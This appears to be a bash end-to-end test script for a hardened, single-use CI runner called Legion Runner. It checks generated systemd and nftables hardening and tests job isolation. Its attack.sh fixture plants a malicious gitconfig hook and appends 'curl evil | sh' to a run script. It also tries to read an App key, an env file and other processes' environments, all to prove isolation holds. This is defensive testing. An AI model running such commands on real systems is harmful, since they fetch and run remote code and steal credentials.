#!/usr/bin/env bash
# Legion Runner — end-to-end lifecycle harness.
#
# Closes the "CI only runs unit tests" gap: this actually drives the real
# control-plane binary through install -> provision -> harden -> (serve one
# job) -> teardown and asserts the guarantees that matter for a hardened,
# single-use runner.
#
# Two tiers:
#
#   local  (no credentials)  Builds legionr, provisions a config, generates and
#          installs the hardening artifacts, and asserts the deploy-blocker
#          fixes are present in the GENERATED output: crash-loop backoff (#73),
#          job isolation in the unit, and populated nftables allow sets that
#          never brick an empty allowlist (#71). With root it then installs the
#          real layout (scripts/install.sh) and runs the job-isolation checks
#          under the generated unit's own capabilities and syscall filter, via
#          systemd when it is PID 1 (CI) or setpriv otherwise. Runs on every PR.
#
#   live   (LEGIONR_TOKEN)   Registers a REAL ephemeral runner against a scratch
#          scope you control, serves exactly one dispatched job, and asserts it
#          succeeded, the work dir was wiped, and two consecutive jobs landed on
#          DISTINCT runner names (single-use). The scope is required: pass
#          --scope owner/repo or set E2E_SCOPE. That repo's default branch must
#          carry a `legion-e2e-receiver.yml` workflow for the harness to
#          dispatch. Not wired into CI, run it by hand.
#
# Usage:
#   scripts/e2e.sh --mode local
#   LEGIONR_TOKEN=... scripts/e2e.sh --mode live --scope owner/repo
set -euo pipefail

MODE="local"
# No default scope: live mode registers a real runner, so the target is always
# named explicitly rather than inherited from a stale constant.
SCOPE="${E2E_SCOPE:-}"
BIN="${LEGIONR_BIN:-}"
# Bound the live wait so a scheduling stall fails loudly instead of hanging CI.
SERVE_TIMEOUT="${E2E_SERVE_TIMEOUT:-300}"

while [ $# -gt 0 ]; do
    case "$1" in
        --mode)  MODE="$2"; shift 2 ;;
        --scope) SCOPE="$2"; shift 2 ;;
        --bin)   BIN="$2"; shift 2 ;;
        *) echo "unknown arg: $1" >&2; exit 2 ;;
    esac
done

log()  { printf '\033[1;32m==>\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*" >&2; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }
pass() { printf '\033[1;32m  ✔ %s\033[0m\n' "$*"; }

# The local tier provisions with --no-probe and never reaches GitHub, so any
# well-formed scope will do. The live tier registers a REAL runner, so refuse to
# guess: name the target or don't run.
if [ -z "$SCOPE" ]; then
    if [ "$MODE" = "live" ]; then
        die "live mode needs a target: pass --scope owner/repo or set E2E_SCOPE"
    fi
    SCOPE="${GITHUB_REPOSITORY:-Wraith-security/Legion_runner}"
fi

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
PREFIX="$(mktemp -d)"
CFG="${PREFIX}/config.json"
RUNNER_DIR="${PREFIX}/runner"
WORK_DIR="${PREFIX}/_work"
cleanup() { rm -rf "$PREFIX" 2>/dev/null || true; }
trap cleanup EXIT

# ── Build (or reuse) the control-plane binary ────────────────────────────────
build_bin() {
    if [ -n "$BIN" ] && [ -x "$BIN" ]; then
        log "using prebuilt legionr: $BIN"
        return
    fi
    log "building legionr (release)"
    cargo build --release --manifest-path "${ROOT}/Cargo.toml" -p legionr-cli
    BIN="${ROOT}/target/release/legionr"
    [ -x "$BIN" ] || die "build did not produce $BIN"
}

# Write a config pointing at the throwaway prefix so we never touch a real host.
provision_config() {
    "$BIN" --config "$CFG" provision "$SCOPE" --container none --no-probe
    # Repoint the runner/work dirs at the scratch prefix (the defaults live under
    # the service user's home, which does not exist in CI).
    local tmp="${PREFIX}/config.edit.json"
    RUNNER_DIR="$RUNNER_DIR" WORK_DIR="$WORK_DIR" python3 - "$CFG" "$tmp" <<'PY'
import json, os, sys
src, dst = sys.argv[1], sys.argv[2]
cfg = json.load(open(src))
cfg["runner_dir"] = os.environ["RUNNER_DIR"]
cfg["work_dir"] = os.environ["WORK_DIR"]
json.dump(cfg, open(dst, "w"), indent=2)
PY
    mv "$tmp" "$CFG"
    mkdir -p "$RUNNER_DIR" "$WORK_DIR"
}

# ── LOCAL tier ───────────────────────────────────────────────────────────────
run_local() {
    log "LOCAL tier — provision + harden against $SCOPE (no credentials)"
    provision_config
    [ -f "$CFG" ] || die "provision did not write a config"
    grep -q "\"kind\": \"repo\"\|\"kind\": \"org\"" "$CFG" || die "config missing scope"
    pass "provision wrote a valid config"

    # Generated (stdout) artifacts carry the deploy-blocker fixes.
    local gen; gen="$("$BIN" --config "$CFG" harden)"
    assert_has() { echo "$gen" | grep -q "$1" || die "$2"; }
    assert_missing() { ! echo "$gen" | grep -q "$1" || die "$2"; }

    assert_has "StartLimitIntervalSec=300" "#73: crash-loop backoff missing from generated unit"
    assert_has "StartLimitBurst=5"         "#73: StartLimitBurst missing from generated unit"
    assert_missing "StartLimitIntervalSec=0" "#73: limiter still disabled"
    pass "#73 crash-loop backoff present (StartLimitIntervalSec=300, Burst=5)"

    assert_missing "StateDirectory=" "a HOME shared between jobs is back in the unit"
    assert_has "ReadOnlyPaths=" "runner template is not read-only in the unit"
    assert_has "AmbientCapabilities=CAP_SETUID CAP_SETGID" "control plane cannot start jobs as the job user"
    assert_has "SystemCallFilter=@setuid capset" "setuid/capset not re-allowed after the @privileged deny"
    pass "unit isolates jobs (read-only template, no shared HOME, setuid caps only)"

    assert_has "policy drop" "nftables is not default-deny"
    pass "nftables egress is default-deny (policy drop)"

    # Install path: refuses an empty allowlist and writes POPULATED sets (#71).
    # Needs root (writes under /etc) and DNS (resolves GitHub endpoints).
    if command -v sudo >/dev/null 2>&1; then
        log "installing hardening artifacts (root) and checking resolved allow sets"
        sudo -E "$BIN" --config "$CFG" harden --install --instance e2e
        local nft="/etc/nftables.d/legion-runner.nft"
        [ -f "$nft" ] || die "#71: install did not write $nft"
        sudo grep -q "elements = {" "$nft" \
            || die "#71: installed ruleset has EMPTY allow sets (would brick the host)"
        pass "#71 installed ruleset carries resolved IPs (elements = { ... })"
        sudo rm -f "$nft" /etc/systemd/system/legionr@.service \
                   /etc/sysctl.d/99-legion-runner.conf 2>/dev/null || true
    else
        warn "no sudo; skipping the root install-path (#71) check"
    fi

    if [ "$(id -u)" -eq 0 ] || command -v sudo >/dev/null 2>&1; then
        run_isolation
    else
        warn "no root; skipping the job-isolation stage"
    fi

    log "LOCAL tier passed"
}

# ── Job isolation (root) ─────────────────────────────────────────────────────
# Installs the real two-user layout and proves, under the generated unit's own
# privileges, that a job cannot read the credential, cannot write the runner
# template, and leaves nothing behind for the next job. Uses throwaway users
# and /opt/legion-runner, so run it only on a disposable host (CI, container).
ISO_INSTANCE="e2e"
ISO_CFG="/etc/legion-runner/${ISO_INSTANCE}.json"
ISO_KEY="/etc/legion-runner/${ISO_INSTANCE}-app.pem"
ISO_SCRIPTS="/usr/local/share/legion-e2e"
SUDO=""
[ "$(id -u)" -eq 0 ] || SUDO="sudo"

have_systemd() { [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; }

# Run legionr with ARGS exactly as the generated unit would: systemd with the
# unit's own [Service] section (ExecStart swapped, oneshot) when systemd is
# PID 1; otherwise setpriv with the same user, capabilities and no_new_privs.
as_unit() {
    local limit="${AS_UNIT_TIMEOUT:-0}"
    if have_systemd; then
        local unit="legionr-e2e-check@.service"
        $SUDO sh -c "sed -e 's|^ExecStart=.*|ExecStart=/usr/local/bin/legionr --config /etc/legion-runner/%i.json $*|' \
            -e 's|^Type=.*|Type=oneshot\\nTimeoutStartSec=${limit}|' -e 's|^Restart=.*|Restart=no|' \
            -e '/^StartLimit/d' /etc/systemd/system/legionr@.service > /etc/systemd/system/${unit}"
        $SUDO systemctl daemon-reload
        $SUDO systemctl reset-failed "legionr-e2e-check@${ISO_INSTANCE}" 2>/dev/null || true
        local since; since="$(date '+%Y-%m-%d %H:%M:%S')"
        local rc=0
        $SUDO systemctl start "legionr-e2e-check@${ISO_INSTANCE}" || rc=$?
        $SUDO journalctl -q -o cat --since "$since" -u "legionr-e2e-check@${ISO_INSTANCE}" | sed 's/^/    | /'
        return "$rc"
    else
        $SUDO env RUST_BACKTRACE=0 sh -c "set -a; . /etc/legion-runner/${ISO_INSTANCE}.env; set +a
            exec timeout ${limit} setpriv --reuid=legionr --regid=legionr --clear-groups \
              --inh-caps=-all,+setuid,+setgid --ambient-caps=-all,+setuid,+setgid \
              --bounding-set=-all,+setuid,+setgid --no-new-privs \
              /usr/local/bin/legionr --config ${ISO_CFG} $*" 2>&1 | sed 's/^/    | /'
        return "${PIPESTATUS[0]}"
    fi
}

run_isolation() {
    log "ISOLATION stage: two-user layout, checked under the unit's privileges ($(have_systemd && echo systemd || echo setpriv))"
    $SUDO env RUNNER_VERSION="${RUNNER_VERSION:-}" "${ROOT}/scripts/install.sh" >/dev/null
    $SUDO install -m 0755 "$BIN" /usr/local/bin/legionr
    $SUDO env LEGIONR_DATA_DIR=/opt/legion-runner /usr/local/bin/legionr --config "$ISO_CFG" \
        provision "$SCOPE" --no-probe --link "" >/dev/null
    $SUDO chown root:legionr "$ISO_CFG" && $SUDO chmod 0640 "$ISO_CFG"
    # A throwaway App key and env file, laid out the way docs/github-app.md says.
    $SUDO openssl genrsa -out "$ISO_KEY" 2048 2>/dev/null
    $SUDO chown root:legionr "$ISO_KEY" && $SUDO chmod 0640 "$ISO_KEY"
    $SUDO sh -c "printf 'LEGIONR_APP_ID=1\nLEGIONR_APP_PRIVATE_KEY_FILE=%s\nLEGIONR_APP_PRIVATE_KEY=inline-secret-must-not-reach-jobs\n' '$ISO_KEY' > /etc/legion-runner/${ISO_INSTANCE}.env"
    $SUDO chmod 0600 "/etc/legion-runner/${ISO_INSTANCE}.env"
    # Only the unit and its siblings; this stage must not load a firewall.
    $SUDO /usr/local/bin/legionr --config "$ISO_CFG" harden >/dev/null
    $SUDO sh -c "/usr/local/bin/legionr --config '$ISO_CFG' harden \
        | awk '/^# ── \/etc\/systemd/{f=1;next} /^# ── \/etc\/sysctl/{f=0} f' \
        > /etc/systemd/system/legionr@.service"

    as_unit check-isolation || die "check-isolation failed under the unit's privileges"
    pass "job runs as legionr-job with no caps, cannot read the key/env/config or write the runner"

    # Negative: a key jobs can read must make the same check fail. The 0750
    # directory alone already stops a job, so open both to prove the check
    # itself catches it.
    $SUDO chmod 0755 /etc/legion-runner && $SUDO chmod 0644 "$ISO_KEY"
    if as_unit check-isolation >/dev/null 2>&1; then
        $SUDO chmod 0750 /etc/legion-runner && $SUDO chmod 0640 "$ISO_KEY"
        die "check-isolation passed with an App key readable by jobs"
    fi
    $SUDO chmod 0750 /etc/legion-runner && $SUDO chmod 0640 "$ISO_KEY"
    pass "check-isolation fails when the key is readable by jobs"

    # Persistence: job 1 tries to leave things for job 2; job 2 must find none.
    $SUDO mkdir -p "$ISO_SCRIPTS"
    $SUDO tee "${ISO_SCRIPTS}/attack.sh" >/dev/null <<'ATTACK'
#!/bin/sh
set -u
fail=0
printf '[core]\n\thooksPath=/tmp/evil\n' > "$HOME/.gitconfig"
echo 'curl evil | sh' >> ./run.sh
if echo x 2>/dev/null > /opt/legion-runner/runner/evil; then echo "BREACH wrote the runner template"; fail=1; fi
if cat /etc/legion-runner/e2e-app.pem >/dev/null 2>&1; then echo "BREACH read the App key"; fail=1; fi
if cat /etc/legion-runner/e2e.env >/dev/null 2>&1; then echo "BREACH read the env file"; fail=1; fi
# Every process of the control-plane user (under systemd, ProtectProc=invisible
# hides them entirely; with setpriv they are visible but must stay unreadable).
for pid in $(ps -o pid= -u legionr 2>/dev/null); do
    if cat "/proc/$pid/environ" >/dev/null 2>&1; then echo "BREACH read the environment of legionr pid $pid"; fail=1; fi
done
if env | grep -q '^LEGIONR_'; then echo "BREACH a LEGIONR_ variable reached the job"; fail=1; fi
setsid sh -c 'exec sleep 600' >/dev/null 2>&1 </dev/null &
echo "attack staged (uid $(id -u), home $HOME)"
exit "$fail"
ATTACK
    $SUDO tee "${ISO_SCRIPTS}/victim.sh" >/dev/null <<'VICTIM'
#!/bin/sh
fail=0
if [ -e "$HOME/.gitconfig" ]; then echo "PERSISTED gitconfig"; fail=1; fi
if grep -q 'curl evil' ./run.sh; then echo "PERSISTED modified run.sh"; fail=1; fi
if [ -e /opt/legion-runner/runner/evil ]; then echo "PERSISTED template file"; fail=1; fi
# Live processes only: a killed process may linger as a zombie until reaped.
left="$(ps -o stat=,comm= -u "$(id -u)" | awk '$1 !~ /^Z/ && $2 == "sleep"' | wc -l)"
if [ "$left" -ne 0 ]; then echo "PERSISTED $left process(es) from the previous job"; fail=1; fi
echo "victim checked (uid $(id -u))"
exit "$fail"
VICTIM
    $SUDO chmod 0755 "${ISO_SCRIPTS}/attack.sh" "${ISO_SCRIPTS}/victim.sh"
    as_unit selftest-job --cmd "${ISO_SCRIPTS}/attack.sh" || die "job 1 breached isolation"
    as_unit selftest-job --cmd "${ISO_SCRIPTS}/victim.sh" || die "job 1 left something for job 2"
    [ -z "$($SUDO ls -A /opt/legion-runner/_work)" ] || die "work dir not empty after the wipe"
    pass "nothing survives a job: HOME, runner copy, template and processes all clean for the next job"

    $SUDO rm -f /etc/systemd/system/legionr-e2e-check@.service /etc/systemd/system/legionr@.service
    have_systemd && $SUDO systemctl daemon-reload || true
}

# ── LIVE tier ────────────────────────────────────────────────────────────────
# Runs after the LOCAL tier, which installed the real two-user layout (and the
# official runner, via scripts/install.sh). Each job is served by `legionr run
# --once` started exactly the way the unit starts it (see as_unit).

# Dispatch the scope's receiver workflow so a job is queued for our label.
dispatch_job() {
    local label="$1"
    log "dispatching legion-e2e-receiver in $SCOPE (label: $label)"
    curl -fsSL -X POST \
        -H "Authorization: Bearer ${LEGIONR_TOKEN}" \
        -H "Accept: application/vnd.github+json" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        "https://api.github.com/repos/${SCOPE}/actions/workflows/legion-e2e-receiver.yml/dispatches" \
        -d "{\"ref\":\"main\",\"inputs\":{\"label\":\"${label}\"}}" \
        || die "workflow_dispatch failed (is legion-e2e-receiver.yml on the scope's default branch?)"
}

# Serve exactly one job; echo the runner name that served it.
serve_one() {
    local label="$1" logf="$2"
    dispatch_job "$label"
    log "serving one job (timeout ${SERVE_TIMEOUT}s)"
    if ! AS_UNIT_TIMEOUT="$SERVE_TIMEOUT" as_unit run --once >"$logf" 2>&1; then
        cat "$logf" >&2
        die "run --once did not complete a job successfully"
    fi
    grep -o 'runner=[^ ]*' "$logf" | head -1 | cut -d= -f2
}

run_live() {
    [ -n "${LEGIONR_TOKEN:-}" ] || { warn "no LEGIONR_TOKEN; skipping LIVE tier"; return 0; }
    [ "$(id -u)" -eq 0 ] || command -v sudo >/dev/null 2>&1 || die "live mode needs root"
    log "LIVE tier: real ephemeral runner against $SCOPE, jobs as legionr-job"

    local label="legion-e2e-${GITHUB_RUN_ID:-local}-${RANDOM}"
    $SUDO env LEGIONR_DATA_DIR=/opt/legion-runner /usr/local/bin/legionr --config "$ISO_CFG" \
        provision "$SCOPE" --no-probe --link "" \
        --labels "self-hosted,linux,legion,ephemeral,${label}" >/dev/null
    $SUDO chown root:legionr "$ISO_CFG" && $SUDO chmod 0640 "$ISO_CFG"
    # The token goes in the env file only (root 0600), the way an operator sets it.
    printf 'LEGIONR_TOKEN=%s\n' "$LEGIONR_TOKEN" \
        | $SUDO tee -a "/etc/legion-runner/${ISO_INSTANCE}.env" >/dev/null
    $SUDO sh -c "/usr/local/bin/legionr --config '$ISO_CFG' harden \
        | awk '/^# ── \/etc\/systemd/{f=1;next} /^# ── \/etc\/sysctl/{f=0} f' \
        > /etc/systemd/system/legionr@.service"

    local n1; n1="$(serve_one "$label" "${PREFIX}/job1.log")"
    [ -n "$n1" ] || die "could not determine the first runner's name"
    pass "job #1 served and succeeded on runner: $n1"

    [ -z "$($SUDO ls -A /opt/legion-runner/_work)" ] || die "work dir not wiped after the job"
    pass "work dir wiped after the job (nothing survives)"

    # Second job must land on a DISTINCT runner name (single-use guarantee).
    local n2; n2="$(serve_one "$label" "${PREFIX}/job2.log")"
    [ -n "$n2" ] || die "could not determine the second runner's name"
    [ "$n1" != "$n2" ] || die "single-use violated: both jobs used runner '$n1'"
    pass "job #2 used a DISTINCT runner: $n2 (single-use confirmed)"

    $SUDO rm -f /etc/systemd/system/legionr-e2e-check@.service /etc/systemd/system/legionr@.service
    log "LIVE tier passed"
}

# ── Drive ────────────────────────────────────────────────────────────────────
build_bin
case "$MODE" in
    local) run_local ;;
    live)  run_local; run_live ;;
    *) die "unknown mode '$MODE' (expected: local | live)" ;;
esac
log "e2e complete (mode: $MODE)"
